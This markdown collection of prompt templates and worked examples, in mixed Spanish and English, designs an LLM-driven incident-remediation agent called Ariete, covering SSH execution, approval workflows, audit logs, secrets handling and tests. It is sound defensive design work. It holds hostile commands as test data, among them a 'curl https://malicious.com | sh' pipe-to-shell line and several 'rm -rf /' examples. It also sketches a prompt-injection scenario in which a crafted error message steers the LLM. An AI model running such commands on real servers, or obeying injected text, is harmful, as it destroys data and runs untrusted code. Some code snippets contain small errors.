# Prompts para Ariete

Colección de prompts efectivos para desarrollo, testing y operaciones.

---

## Prompts de Arquitectura

### 1. Validación de Decisión AD
```
Revisemos AD-N: [describir]
¿Qué invariantes bloquea? ¿Qué divergencias previene?
¿Hay un caso donde se rompería?
```

**Ejemplo Ariete — AD-1: Datastore Strategy**
```
AD-1: PostgreSQL principal, Redis solo para Sidekiq (no incidents/credentials)

Invariantes bloquea:
- Redis no puede ser source-of-truth (no transactional)
- Incidents/credentials no pueden split en dos BDs

Divergencias previene:
- Split-brain state (incidents en Redis, audit en PG)
- Approval race condition (ambiguous state)
- Credential desync entre workers

¿Caso se rompe?
- Sí: multi-region sin coordinación central
  → Mitigation: v2 con Vault + cross-region replication
```

**Ejemplo Ariete — AD-2: Agent Execution Isolation**
```
AD-2: SSH ejecuta en Sidekiq worker, nunca en request path

Invariantes bloquea:
- No puedes ejecutar SSH desde controller
- No puedes compartir credentials entre requests

Divergencias previene:
- Operator bloquea esperando SSH timeout
- Credentials loggeadas en Rails request logs
- Race condition si dos requests same incident

¿Caso se rompe?
- Sí: if operador espera respuesta síncrona
  → Mitigation: async approval, long-polling UI
```

### 2. Máquina de Estados de Incidents
```
Estados: Detected → Diagnosing → ProposedFix → AwaitingApproval → Executing → Resolved/Failed

Para [escenario], ¿qué estado es imposible?
¿Hay transición que necesite rollback?
```

**Ejemplo Ariete**
```
Estados Ariete:
Detected → Diagnosing → ProposedFix → AwaitingApproval → Executing → Resolved/Failed
         ↑                                          ↓
         └──── (off-hours) ─────────────────────────┘

Escenario 1: Operador clickea approve en Detected
¿Qué pasa? Imposible. Requiere Diagnosing → ProposedFix primero.
¿Cómo prevenimos? FK constraint en approval records (incident state must be ProposedFix)

Escenario 2: Incident en Executing, worker muere mid-SSH
¿Rollback? Parcial. Logs qué pasó, operador decide reintentar o mark resolved manually.
¿AC testeable? Worker death no pierde state (in DB, not in memory)

Escenario 3: Off-hours approval skips AwaitingApproval, pero permission check falla
¿Qué pasa? Diagnosing → ProposedFix, no → Executing. Stays in ProposedFix.
¿Cómo debuggeamos? Audit log says "off-hours permission denied" + reason
```

### 3. Seguridad en Ejecución Remota
```
Agente ejecuta SSH remotely.
Diseña validación que:
- Previene command injection
- No expone credenciales en logs
- Audita quién/qué/cuándo
- Rollback si falla
```

**Ejemplo Ariete — ExecutionWorker**
```
Flujo:
1. Worker retrieves incident.proposed_fix = "systemctl restart nginx"
2. Fetch encrypted SSH key, decrypt in-memory
3. Validate command against allowlist (if off-hours)
4. Execute via Net::SSH with timeout=30s
5. Capture output, audit log (no plaintext key in log)
6. Mark incident resolved/failed

Command injection prevention:
- Never shell_escape proposed_fix (LLM output might be malicious)
- Use Net::SSH exec!, not system() or backticks
- Validate proposed_fix matches known patterns (systemctl, service, etc.)
- Reject anything with pipes, redirects, semicolons, or `;` unless explicitly safe

Credential leak prevention:
- Decrypt solo en worker memory, never write to disk/logs
- SSH session never appears in exception trace
- AuditLog records: command, exit_code, output_snippet (first 500 chars, no full output)
- Exception: if output contains "password=", redact before audit logging

Rollback on failure:
- exit_code != 0 → incident state = failed, not resolved
- Operator sees: "Command failed: systemctl restart nginx (exit 1)"
- Operator can: view logs, retry, or approve manual fix
```

---

## Prompts de Features

### 4. Desglose de Feature en Stories
```
Feature: [nombre]
Requirement: [qué debe hacer]

Divide en historias independientes.
Cada historia:
- Completable en 1 sprint
- AC testeable (Given/When/Then)
- Sin dependencias futuras
- Con documentación mínima
```

**Ejemplo Ariete — E3: Approval & Execution**
```
Feature: Human Approval & Remediation Execution (with off-hours autonomy)

Requisito: Operador aprueba fixes desde web UI; Ariete ejecuta remotamente. 
Off-hours: ejecuta sin aprobación si allowlist + time window match.

Breakdown en stories (1 sprint cada una):

S3.1: Build Web UI Approval Widget
  - Mostrar incidents en estado ProposedFix
  - Mostrar diagnosis + proposed fix + RAG context
  - Botón "Approve" con opcional comment field
  - AC: UI loads en <2s, shows correct incident data, approve button works

S3.2: Approval State Machine & Race Condition Prevention
  - Crear approval record, validar exactly 1 approval por incident
  - Validar permisos (approver = domain owner or admin)
  - Transición incident state: ProposedFix → AwaitingApproval
  - AC: concurrent approvals fallan gracefully, race condition imposible

S3.3: SSH Execution of Approved Remediation
  - ExecutionWorker toma incident con approval
  - Conecta SSH, ejecuta proposed_fix commands
  - Capture output, audit log
  - Transición incident: AwaitingApproval → Executing → Resolved/Failed
  - AC: exit_code 0 = Resolved, non-zero = Failed, all actions audited

S3.4: Off-Hours Autonomous Execution (variant)
  - Si incident detectado durante off-hours window (e.g., 22:00-06:00)
  - Skip AwaitingApproval, ir directo Diagnosing → Executing si allowlist OK
  - Audit log: autonomous=true, reason="off_hours_permitted"
  - AC: off-hours respected, allowlist validated, non-whitelisted commands blocked

Dependencias: S3.2 es prerequisito (state machine), rest pueden parallelizar.
```

### 5. Acceptance Criteria
```
Historia: [describir]

Escribe 3-4 ACs (BDD):
- Camino feliz
- Bug común #1
- Bug común #2
- Ejecutable sin UI

¿Cómo fallaría en producción?
```

**Ejemplo Ariete — S3.1: Approval Widget**
```
Historia: Como operador, veo incidents pendientes de aprobación en web UI, 
para poder reviewar diagnosis y approbar fixes.

AC 1 — Camino feliz:
Given operador está logged in, incident existe en state='proposed_fix'
When operador navega a /incidents dashboard
Then ve lista de incidents con columns: url, diagnosis, proposed_fix, timestamp
And puede click en incident → detail view con full diagnosis + RAG context
And ve botón "Approve" con comment field

AC 2 — Permisos:
Given operador es logged in pero NO es owner del domain
When intenta ver incident de otro user's domain
Then API returns 403 Forbidden
And UI shows "No access to this incident"

AC 3 — Race condition:
Given dos operadores ven mismo incident
When ambos cliquean Approve <1s apart
Then first approval succeeds, second gets 409 Conflict
And only one approval record existe, incident no se ejecuta 2x

AC 4 — Sin UI (API):
Given operador usa curl + auth token
When POST /incidents/:id/approve con {"comment": "approved"}
Then approval record created, incident transitioned to awaiting_approval
And response includes incident state + execution status

¿Fallaría en producción?
- Si auth token no se valida → 401 Unauthorized
- Si incident no existe → 404 Not Found
- Si estado no es proposed_fix → 400 Bad Request
- Si operador no tiene permisos → 403 Forbidden
```

### 6. Complejidad Escondida
```
Historia parece simple: [describir]

¿Qué complejidad falta?
- ¿Datos no existen?
- ¿Permisos?
- ¿Qué falla?
- ¿Es realmente independiente?
```

**Ejemplo Ariete — S2.3: LLM Proposal**
```
Historia parece simple: "Llama LLM con logs, obtén proposed fix"

Complejidad escondida:

1. ¿Datos existen?
   - ¿Logs ya están en incident.diagnosis? Si no, S2.2 debe completar primero.
   - ¿RAG documents existen? Si no, vector search retorna empty, LLM sin contexto.
   - ¿OpenAI API key en credentials? Si no, LLM call falla.

2. ¿Permisos?
   - ¿Worker tiene acceso a OpenAI? (firewall, rate limits)
   - ¿Incident ownership checks antes de LLM call? (no quiero LLM viendo otro user's logs)

3. ¿Qué falla?
   - OpenAI API timeout (>30s) → worker retries? Exponential backoff?
   - LLM generates malicious command → validation before storing?
   - LLM hallucinates (generates "sudo rm -rf /") → allowlist validation off-hours?
   - RAG retrieval takes 5s → total latency now 45s (MTTR target broken)

4. ¿Independiente?
   - S2.3 depende de S2.1 (SSH connection) + S2.2 (logs gathered)
   - Puede run en paralelo con S1.2 (monitoring) pero no S3.1 (approval UI)
   - NO puedes implementar S2.3 sin S2.1 y S2.2 completas

Riesgos a mitigar en story:
- LLM output injection: sanitize proposed_fix antes de audit_log
- Hallucination: test con known-bad prompts (e.g., "delete all files")
- Latency: timeout OpenAI call en 30s, fallback a simple heuristic if timeout
- RAG empty: test LLM works sin RAG context (degraded diagnosis but not broken)
```

---

## Prompts de Seguridad

### 7. Auditabilidad de Acciones
```
Acción crítica: [describir]

Diseña audit log que asegure:
- Quién (user_id)
- Qué (command)
- Cuándo (timestamp)
- Dónde (endpoint)
- Resultado (exit code)
- No editable después

¿Métrica a compliance cada mes?
```

**Ejemplo Ariete — ExecutionWorker Action**
```
Acción crítica: Ejecución de comando SSH en infraestructura remota

Audit log record:
{
  user_id: <approver_id>,          # Quién autorizó
  action: 'execute_fix',            # Qué hizo
  incident_id: <incident_id>,       # Contexto
  details: {                         # Dónde + cómo
    infrastructure_id: <id>,
    hostname: 'api.example.com',
    command: 'systemctl restart nginx',
    exit_code: 0,
    duration_ms: 3200,
    output_lines: 5,
    approver_id: <id>,              # Quién aprobó (redundant pero útil)
    approval_timestamp: '2026-10-05T14:23:00Z',
    execution_timestamp: '2026-10-05T14:23:05Z'
  },
  created_at: '2026-10-05T14:23:05Z',  # Cuándo (inmutable timestamp)
  ip_address: '203.0.113.45'        # Auditar origen request
}

Immutabilidad:
- audit_logs table: NEVER UPDATE, NEVER DELETE (append-only)
- PG row-level security: revoke UPDATE/DELETE on audit_logs from app_user
- Backup: daily backup to S3 (compliance retention)

Métrica a compliance:
- "Failed execution attempts": count rows where exit_code != 0
- "Autonomous actions": count rows where action='autonomous_execute_fix'
- "Approval SLA": avg time between approval_timestamp - incident.detected_at
- "High-risk commands": count systemctl/service/kill (no delete allowed)
- "Compliance report": monthly: total actions, failed, autonomous %, SLA met %
```

### 8. Límites de Confianza
```
Agente ejecuta comandos en servidores.

Límites v1:
- [límite 1]
- [límite 2]

¿Escenario de breach cada uno?
¿Cómo prevenimos en código?
```

**Ejemplo Ariete**
```
Límites v1 (no exceder):

Límite 1: Lectura solamente en logs (no escribir, no eliminar)
Breach: "systemctl restart nginx" ejecuta OK, pero agente también corre "rm -rf /tmp/cache"
Prevención: Allowlist de comandos (systemctl, service, restart, reload, status)
            Reject anything con pipes, semicolons, output redirection

Límite 2: Máximo 1 comando por incident
Breach: Agente ejecuta 10 commands secuencialmente, v1 thinks solo 1 pasó
Prevención: proposed_fix es single command. Para multi-step fix → human intervention.
            Rate limit: 1 execution per incident per 5 minutes (prevent hammering)

Límite 3: Credenciales SSH válidas solo en memory (Sidekiq worker context)
Breach: SSH key aparece en debug logs, server memory dump, exception trace
Prevención: Decrypt in ExecutionWorker.perform(), never log/pass to other services
            Never attach key to incident records or audit logs
            Test: tail production.log | grep -i "key\|password\|ssh" (should be empty)

Límite 4: Off-hours autonomy solo durante configured windows (e.g., 22:00-06:00)
Breach: Agente ejecuta autonomously durante business hours (aprobación skipped)
Prevención: Check incident.detected_at against OffHoursPolicy.active?
            If not in window, transition to AwaitingApproval (never skip)
            Audit log: reason="off_hours_check_failed" si se intenta bypass

Limit 5: Multi-tenancy isolation (user A no ve user B's incidents)
Breach: User A queries /incidents, obtiene incidents de domains de User B
Prevención: Scoping: `current_user.domains.incidents` (not global Incident.all)
            FK constraints: incident → monitored_url → domain → user
            Test: assert_raises ActiveRecord::RecordNotFound cuando cross-tenant access

Scenario drill:
- Scenario: Insider threat (admin approves malicious command)
  → Mitigated by: audit trail captures everything, can review post-incident
  → But v1 doesn't prevent: add approval comments field para "why approving" (compliance paper trail)
  
- Scenario: LLM injection (attacker crafts error message containing "rm -rf /")
  → Mitigated by: allowlist validation, LLM output sanitized
  → Test: pass known-malicious error into diagnostics engine, verify no execution
```

### 9. Secrets & Encryption
```
Credenciales SSH en PostgreSQL como encrypted_blob.

¿Qué pasa si:
1. BD se roba
2. Worker muere con clave en memoria
3. Alguien tail -f logs durante ejecución
4. Usuario A accede credenciales de usuario B

¿Prevención cada uno?
```

**Ejemplo Ariete**
```
1. Base de datos robada (encrypted_blob):
   Scenario: Attacker obtiene PostgreSQL backup file + ciphertext
   Risk: If rails.key también stolen → keys decrypted
   Prevention:
   - Separate rails.key from source code (in secrets backend, not git)
   - Rotate rails.key quarterly (all keys re-encrypted with new key)
   - Use strong encryption (Rails uses AES-256-GCM by default ✓)
   - For >100 domains, upgrade to HashiCorp Vault (separate secret store)

2. Worker muere con clave en memory:
   Scenario: Sidekiq process crashes mid-execution, core dump captured
   Risk: SSH key visible in memory dump
   Prevention:
   - Set core dump limit to 0 (ulimit -c 0 in Dockerfile)
   - Use Ruby string clearing (SecureRandom, RbNaCl for sensitive data)
   - Don't persist decrypted key to thread/instance variables (local variable scope)
   - Memory expires: decrypt locally in method, let GC clean up
   Code example:
   ```ruby
   def execute_command
     infrastructure = Infrastructure.find(id)
     ssh_key = infrastructure.decrypt_ssh_key  # returns plaintext, local var
     # ssh_key is local, not stored anywhere
     Net::SSH.start(host, user, key_data: ssh_key) { |ssh| ... }
     # ssh_key falls out of scope, GC cleans memory
   end
   ```

3. tail -f logs durante ejecución:
   Scenario: Ops engineer runs `tail -f log/production.log` during SSH execution
   Risk: SSH key appears in debug output
   Prevention:
   - Never log SSH key anywhere (check entire codebase for .key, .secret in logs)
   - Log levels: set infrastructure.encrypted_ssh_key to never debug-print
   - Use `secrets_filter` gem to redact passwords/keys from exception traces
   - Test: egrep -r "ssh.*key|infrastructure.*key" log/ (should match zero)

4. Usuario A accede credenciales de usuario B:
   Scenario: User A does GET /infrastructures/999 (B's infrastructure)
   Risk: Response includes encrypted_ssh_key in JSON, A decrypts offline
   Prevention:
   - Never expose encrypted_ssh_key in API responses (exclude from serializers)
   - Add authorization check: authorize_user_owns_domain!(infrastructure.domain)
   - If user_id != domain.user_id, return 403 Forbidden
   - Test: assert_raises Pundit::NotAuthorizedError when unauthorized user accesses
   - Audit log: action='unauthorized_access_attempt', log user + IP

Secrets rotation plan:
- Quarterly: generate new rails.key, re-encrypt all stored credentials
- Incident: if key compromised, rotate immediately (short-term use secondary key)
- v2: integrate with Vault for dynamic credential generation (ephemeral keys per job)
```

---

## Prompts de Testing

### 10. Testing Crítico
```
Feature: [describir - e.g., "ejecutar en off-hours sin aprobación"]

Escribe 3 tests:
1. Falla si feature no existe
2. Falla si authorization se saltó
3. Falla si no se audita

Usa datos reales, no mocks.
```

**Ejemplo Ariete — S3.4: Off-Hours Autonomy**
```
Feature: "Ejecutar remediación sin aprobación durante off-hours si allowlist OK"

Test 1 — Falla sin feature (baseline):
  Given incident en state='proposed_fix', created durante off-hours (23:00)
  When ExecutionWorker.perform sin feature flag enabled
  Then incident state permanece 'proposed_fix' (no ejecución)
  Assertion: incident.reload.state == 'proposed_fix'

Test 2 — Falla si authorization saltó:
  Given domain.autonomous_enabled = true, domain.autonomous_hours = '22:00-06:00'
  Given proposed_fix = "curl https://malicious.com | sh" (NOT in allowlist)
  When ExecutionWorker runs during off-hours
  Then incident transitions to 'failed' (blocked, no execution attempt)
  Assertion: audit_log.last.details['reason'] == 'off_hours_command_not_whitelisted'

Test 3 — Falla si no se audita:
  Given incident approves off-hours, command executes successfully
  When ExecutionWorker completes
  Then audit_log record exists con:
    - action='autonomous_execute_fix'
    - autonomous=true
    - approver_id=nil (system, not human)
    - command='systemctl restart nginx'
    - exit_code=0
  Assertion: assert_equal 1, AuditLog.where(action: 'autonomous_execute_fix').count
             assert_includes audit_log.details['reason'], 'off_hours'

Test: Real data, no mocks
  - Use FactoryBot to create: User, Domain, Infrastructure, MonitoredUrl, Incident
  - Real PostgreSQL (test DB), not sqlite mocks
  - Real Sidekiq job execution (Sidekiq::Testing.fake! → job enqueued, then .drain)
  - SSH mocked via double_stubs, NOT no-op mocks
```

### 11. Testing de Seguridad
```
Endpoint: POST /incidents/:id/approve

¿Qué requests fallan?
- Sin auth
- Token expirado
- Usuario no es owner
- Incident en 'executing'
- Approval ya existe

Escribe test cada falla.
```

**Ejemplo Ariete**
```
Endpoint: POST /incidents/:id/approve (JSON API)

Fail scenario 1 — Sin auth:
  When POST /incidents/999/approve sin Authorization header
  Then response status 401 Unauthorized
  And response.body includes "Missing or invalid authentication token"
  Assertion: assert_response :unauthorized

Fail scenario 2 — Token expirado:
  Given user crea token con exp=1 día atrás
  When POST /incidents/999/approve con token expirado
  Then response status 401 Unauthorized
  Assertion: assert_response :unauthorized

Fail scenario 3 — Usuario no es owner:
  Given incident belongs to domain owned por User B
  Given current_user = User A
  When User A does POST /incidents/999/approve
  Then response status 403 Forbidden
  Assertion: assert_response :forbidden
             audit_log incluye "unauthorized_approval_attempt"

Fail scenario 4 — Incident en 'executing':
  Given incident.state = 'executing' (approval ya no válida)
  When POST /incidents/999/approve
  Then response status 409 Conflict (or 400 Bad Request)
  And response.body includes "Cannot approve incident that is already executing"
  Assertion: assert_response :conflict

Fail scenario 5 — Approval ya existe:
  Given incident con approval record existente
  Given second operator intenta approbar simultáneamente
  When POST /incidents/999/approve (same incident, different approver)
  Then response status 409 Conflict
  And incident.approvals.count == 1 (no duplicate)
  Assertion: assert_equal 1, Incident.find(999).approvals.count

Passing test (control):
  Given valid auth, valid user, incident en state='proposed_fix', no approval exist
  When POST /incidents/999/approve con valid JSON
  Then response status 201 Created
  And incident.reload.state == 'awaiting_approval'
  And audit_log.last.action == 'approve_fix'
```

### 12. SSH Integration Testing
```
Agente conecta por SSH remoto.

¿Cómo testeas sin production SSH?

Opciones:
- Docker local (fake infra)
- SSH tunnel a staging
- Fixtures de output SSH

¿Cuál es más rápido/confiable?
```

**Ejemplo Ariete**
```
Opciones para SSH testing:

Option A: Docker local (fake infraestructura)
  Pros: Aislado, rápido, reproducible
  Cons: Setup complexity, no testing real SSH edge cases
  Setup:
    - docker run -d sshd_image con known key + root password
    - Sidekiq worker conecta a localhost:2222 (forwarded)
    - Test: systemctl restart nginx (or fake service)
  Test exec time: <1s
  
  Use case: Happy path testing (connection works, command succeeds, output captured)
  
Option B: SSH tunnel a staging
  Pros: Real SSH edge cases, real service errors
  Cons: Lento (network latency), flaky (staging unreliable), shared resource
  Setup:
    - SSH tunnel: ssh -L 2222:staging.internal:22 jump_host
    - Sidekiq worker conecta a localhost:2222
  Test exec time: 3-5s per test
  
  Use case: Integration testing (real service state, timeouts, permission errors)
  
Option C: Fixtures de output SSH
  Pros: Muy rápido, deterministic
  Cons: No testing actual SSH, hallucinating edge cases
  Setup:
    - Stub Net::SSH.start to return fixture responses
    - fixtures/ssh_responses.json: {"systemctl restart nginx": "Unit restarted", ...}
  Test exec time: <100ms
  
  Use case: Unit testing command parsing, error handling (doesn't test SSH itself)

Recommendation para v1:
  - Unit tests: Option C (fixtures) — fast CI feedback
  - Integration tests: Option A (Docker) — real but isolated
  - Staging tests: Option B (tunnel) — run nightly, not in CI
  
Test suite:
  
  # spec/sidekiq/execution_worker_spec.rb
  describe ExecutionWorker do
    context "execute remediation via SSH" do
      it "successfully restarts service" do
        # Option C (unit, fixtures)
        allow(Net::SSH).to receive(:start).and_return(mock_ssh_channel)
        worker.perform(incident.id)
        expect(incident.reload.state).to eq('resolved')
      end
      
      it "handles SSH timeout gracefully" do
        # Option C (unit, fixture error)
        allow(Net::SSH).to receive(:start).and_raise(Net::SSH::ChannelOpenFailed)
        worker.perform(incident.id)
        expect(incident.reload.state).to eq('failed')
        expect(AuditLog.last.details['error']).to include('Channel open failed')
      end
      
      it "denies unsafe commands" do
        # Unit, no SSH needed
        incident.update(proposed_fix: "rm -rf /")
        worker.perform(incident.id)
        expect(incident.reload.state).to eq('failed')
        expect(AuditLog.last.details['reason']).to include('not whitelisted')
      end
    end
  end
  
  # spec/integration/execution_with_docker_spec.rb (runs separately)
  describe "SSH execution against Docker container" do
    before { start_docker_sshd_container }
    
    it "executes commands in real SSH environment" do
      # Option A (integration, Docker)
      incident.update(proposed_fix: "systemctl restart nginx")
      worker.perform(incident.id)
      expect(incident.reload.state).to eq('resolved')
      # Verify service actually restarted (check service status in container)
    end
  end
```

---

## Prompts de Data & State

### 13. Integridad en Carrera
```
Dos operadores cliquean "Approve" simultáneamente.

¿Qué sucede?
- ¿2 approval records?
- ¿2 ejecuciones?
- ¿Cómo prevenimos?

Diseña el código.
(Hint: optimistic locking? DB constraint?)
```

**Ejemplo Ariete**
```
Scenario: Operator A y B ven mismo incident en ProposedFix, ambos cliquean Approve <1s apart

Sin prevención:
  - 2 approval records creados (ambos con approved_at)
  - ExecutionWorker.perform se enqueuea 2 veces
  - Command ejecuta 2 veces (catastrophe si "rm -rf" o similar)
  - Audit shows 2 approvals, ambos success (confusing)

Con prevención (DB-level constraint):
  
  # Migration: add unique constraint to approvals
  class AddUniqueApprovalPerIncident < ActiveRecord::Migration
    def change
      add_index :approvals, :incident_id, unique: true,
                where: "id IS NOT NULL"  # Ensures only one approval per incident
    end
  end
  
  # Model: 
  class Approval < ApplicationRecord
    belongs_to :incident
    validates :incident_id, uniqueness: { scope: nil }  # Explicit validation
  end
  
  # Controller:
  class ApprovalsController < ApplicationController
    def create
      @incident = Incident.find(params[:incident_id])
      authorize @incident
      
      begin
        @approval = Approval.create!(
          incident_id: @incident.id,
          approver_id: current_user.id,
          comment: params[:comment]
        )
        @incident.update(state: 'awaiting_approval')
        enqueue_execution_worker(@incident)
        
        respond_with(@approval, status: 201)
      rescue ActiveRecord::RecordNotUnique
        # Second approval attempt hits unique constraint
        respond_with(error: 'Approval already exists for this incident'), status: 409
      end
    end
  end

Flujo:
  1. Operator A: POST /incidents/999/approve → Approval created ✓
  2. Operator B: POST /incidents/999/approve (simultáneamente)
  3. DB unique constraint fires → ActiveRecord::RecordNotUnique raised
  4. Rescue catches, responds 409 Conflict
  5. Only 1 approval record exists, 1 execution job enqueued
  
Test para carrera:
  
  it "prevents duplicate approvals via unique constraint" do
    incident = create(:incident, state: 'proposed_fix')
    
    # Simulate concurrent requests
    thread1 = Thread.new do
      Approval.create!(incident_id: incident.id, approver_id: user1.id)
    end
    thread2 = Thread.new do
      Approval.create!(incident_id: incident.id, approver_id: user2.id)
    end
    
    thread1.join
    thread2.join
    
    expect(incident.approvals.count).to eq(1)  # Only one succeeded
    expect(incident.reload.state).to eq('awaiting_approval')
  end
```

### 14. Auditabilidad de Estado
```
Transitions: Detected → Diagnosing → ...

Cada transición auditable:
- Quién (system vs user)?
- Cuándo?
- Por qué (contexto)?

Diseña audit_logs sin duplicar incidents.
```

**Ejemplo Ariete**
```
States: Detected → Diagnosing → ProposedFix → AwaitingApproval → Executing → Resolved/Failed

Cada transición crea audit_log entry (NO modifica incidents table):

State change: Detected → Diagnosing
  Trigger: MonitoringLoop detects failure, enqueues DiagnosticsWorker
  Audit log:
    {
      user_id: nil,  # System action, not human-triggered
      action: 'state_transition',
      incident_id: 123,
      details: {
        from_state: 'detected',
        to_state: 'diagnosing',
        reason: 'diagnostics_job_enqueued',
        triggered_by: 'MonitoringLoopWorker',
        timestamp: '2026-10-05T14:00:00Z'
      }
    }

State change: ProposedFix → AwaitingApproval
  Trigger: Operator approves via API
  Audit log:
    {
      user_id: 42,  # Operator who approved
      action: 'state_transition',
      incident_id: 123,
      details: {
        from_state: 'proposed_fix',
        to_state: 'awaiting_approval',
        reason: 'human_approval_received',
        approver_id: 42,
        approver_comment: 'Looks good, proceeding with restart',
        timestamp: '2026-10-05T14:23:00Z'
      }
    }

State change: Executing → Resolved (or Failed)
  Trigger: ExecutionWorker completes
  Audit log:
    {
      user_id: nil,  # System
      action: 'state_transition',
      incident_id: 123,
      details: {
        from_state: 'executing',
        to_state: 'resolved',
        reason: 'execution_succeeded',
        command: 'systemctl restart nginx',
        exit_code: 0,
        duration_ms: 3200,
        timestamp: '2026-10-05T14:23:05Z'
      }
    }

Query auditability:
  # Timeline for compliance: "show me all state changes for incident 123"
  AuditLog.where(incident_id: 123)
           .where(action: 'state_transition')
           .order(:created_at)
  
  # Results in chronological order (immutable, append-only)
```

### 15. Rollback de Fallo
```
Remediación ejecuta "systemctl restart nginx", exit_code=1.

¿Qué después?
- ¿Estado 'failed' y nadie lo ve?
- ¿Operator sabe qué salió?
- ¿Puede reintentar?
- ¿Prevenir loops infinitos?
```

**Ejemplo Ariete**
```
Execution fails: systemctl restart nginx (exit_code=1)

Flujo:
  1. ExecutionWorker conecta SSH, ejecuta command
  2. Service returns exit_code=1 (error)
  3. Worker captura: stdout="", stderr="Job for nginx.service failed because the control process exited with error code."
  4. Incident state transitioned: Executing → Failed
  5. Audit log creado con error details
  6. Notification enviada a operator (webhook o email)

¿Operador sabe?
  - Incident detail view muestra: "State: Failed"
  - Execution output mostrado: stderr log snippet
  - Proposed fix (lo que intentó): "systemctl restart nginx"
  - Exit code: 1
  - Operator puede click "View Full Output" (audit log details)

¿Puede reintentar?
  Option 1: Operador modifica incident.proposed_fix, cliquea "Re-diagnose"
    → Transición: Failed → Detected → Diagnosing (new diagnostics cycle)
  Option 2: Operador cliquea "Retry with same fix"
    → Transición: Failed → AwaitingApproval → Executing
  
  Implementation:
    ```ruby
    # app/models/incident.rb
    def retry_execution
      raise "Cannot retry unless state is 'failed'" unless state == 'failed'
      update(state: 'awaiting_approval')
      AuditLog.create(
        incident_id: id,
        action: 'manual_retry',
        details: { from: 'failed', to: 'awaiting_approval' }
      )
      enqueue_execution_worker
    end
    ```

¿Prevenir loops infinitos?
  Tracking: incidents table tracks retry count
  
  ```ruby
  add_column :incidents, :execution_attempts, :integer, default: 0
  add_column :incidents, :last_failed_at, :datetime
  ```
  
  Logic:
    ```ruby
    if incident.execution_attempts >= 3 && time_since_last_attempt < 5.minutes
      # Too many retries, too fast
      incident.update(state: 'manual_intervention_required')
      alert_operator("Incident stuck after 3 retries, manual intervention needed")
    end
    ```
  
  Audit trail:
    AuditLog.where(incident_id: id, action: 'state_transition')
            .where("details->>'from_state' = 'executing' AND details->>'to_state' = 'failed'")
            .count  # Shows how many times execution failed
```

---

## Prompts de Performance

### 16. Métricas
```
Ariete debe 99.5% uptime.

¿Qué 3-5 métricas?
- [métrica 1]: cómo medirla
- [métrica 2]: ...

¿Métrica que mejor predice "Ariete está roto"?
```

**Ejemplo Ariete**
```
Target: Monitored services 99.5% uptime (baseline 98.5%)

Key metrics:

Métrica 1: MTTR (Mean Time To Resolution)
  Medida: avg(incident.resolved_at - incident.detected_at)
  Query:
    Incident.where(state: 'resolved')
            .where(created_at: 1.month.ago..)
            .average('EXTRACT(EPOCH FROM (resolved_at - detected_at))')
  Target v1: <15 minutes
  Target v2: <5 minutes
  Why: Faster resolution = less downtime
  Alert: If MTTR > 30min, page on-call (diagnostic query failed or Ariete stuck)

Métrica 2: Autonomous Fix Rate
  Medida: count(incidents where autonomous=true) / count(all incidents) * 100%
  Query:
    auto_count = AuditLog.where(action: 'autonomous_execute_fix').group(:incident_id).count.size
    total_count = Incident.where(state: 'resolved').count
    rate = auto_count.to_f / total_count * 100
  Target v1: 20%
  Target v2: 30%+
  Why: Less operador interruptions during off-hours
  Alert: If rate drops below 15%, check command_allowlist (might be too restrictive)

Métrica 3: Execution Success Rate
  Medida: count(state='resolved') / count(state='resolved' OR 'failed') * 100%
  Query:
    resolved = Incident.where(state: 'resolved', created_at: 1.week.ago..).count
    failed = Incident.where(state: 'failed', created_at: 1.week.ago..).count
    success_rate = resolved.to_f / (resolved + failed) * 100
  Target v1: 80% (some failures expected, LLM diagnoses wrong sometimes)
  Target v2: 90%+
  Why: Measure diagnostic quality (is Ariete proposing good fixes?)
  Alert: If success_rate < 70%, review recent failed incidents (pattern of bad diagnosis)

Métrica 4: SSH Connection Reliability
  Medida: count(successful SSH connect) / count(attempted) * 100%
  Query:
    success = AuditLog.where(action: 'execute_fix', "details->>'exit_code' = '0'").count
    failed_connect = AuditLog.where(action: 'execute_fix', "details->>'error' LIKE 'Net::SSH::%'").count
    reliability = success.to_f / (success + failed_connect) * 100
  Target v1: 95% (some network hiccups expected)
  Why: SSH failures block entire flow
  Alert: If reliability < 90%, check: network latency, SSH service on remote hosts, firewall rules

Métrica 5: Approval SLA
  Medida: avg time from proposed_fix → operator approval
  Query:
    AuditLog.where(action: 'state_transition', "details->>'to_state' = 'awaiting_approval'")
            .where(created_at: 1.week.ago..)
            .average('EXTRACT(EPOCH FROM (created_at - incident.detected_at))')
  Target v1: <15 minutes (during business hours)
  Why: Operador shouldn't be slow to approve
  Alert: If SLA > 30min consistently, operator might be overloaded (hire or optimize)

¿Métrica que mejor predice "Ariete roto"?
  → MTTR is the canary metric
  If MTTR spikes >30min:
    1. Either diagnostics taking too long (LLM/SSH slow)
    2. Or operator not approving (SLA slipped)
    3. Or execution failing repeatedly (success_rate dropped)
  
  Check in order:
    SELECT AVG(extracted(EPOCH FROM (diagnosing_at - detected_at))) as diagnosis_time
    → If >20s, LLM or SSH bottleneck
    
    SELECT AVG(extracted(EPOCH FROM (awaiting_approval_at - proposed_fix_at))) as approval_time
    → If >10min, operator slow
    
    SELECT success_rate from metric (above)
    → If <80%, diagnoses wrong
  
  Dashboard alert: trigger when MTTR > 20min (vs 15min target)
```

### 17. Latencia
```
Diagnosis toma 45s.

Breakdown:
- Detección URL: Xs
- SSH connect: Ys
- Logs: Zs
- LLM: Ws
Total: X+Y+Z+W

¿Dónde ser más rápido sin perder precisión?
```

**Ejemplo Ariete**
```
Diagnosis latency breakdown (45s actual, 30s target):

Componente 1: Detección URL (2s)
  - Monitoring loop checks URL
  - Network latency to URL + response time
  - Current: 2s ✓ (acceptable, don't optimize)

Componente 2: Job enqueueing (0.5s)
  - Sidekiq job created, enqueued to Redis
  - Current: 0.5s ✓ (instant)

Componente 3: SSH connection (5s)
  - Sidekiq worker starts
  - Decrypt SSH key
  - Establish SSH session to infrastructure
  - Current: 5s (HIGH - SSH handshake is slow)
  - Optimize: SSH key caching? Connection pooling?
  - Tradeoff: Connection pooling adds complexity, security risk if keys held in memory
  - Decision v1: Accept 5s, v2 explore connection pooling

Componente 4: Log collection (12s)
  - SSH: tail -100 /var/log/error.log
  - SSH: systemctl status <service>
  - SSH: df -h
  - Network latency for each command (commands sequential, not parallel)
  - Current: 12s (MEDIUM)
  - Optimize: Parallel SSH commands? (tail + status + df at same time)
  - Code:
    ```ruby
    channel1 = ssh.open_channel { |ch| ch.exec("tail -100 /var/log/error.log") { logs_callback } }
    channel2 = ssh.open_channel { |ch| ch.exec("systemctl status nginx") { status_callback } }
    channel3 = ssh.open_channel { |ch| ch.exec("df -h") { disk_callback } }
    ssh.loop
    ```
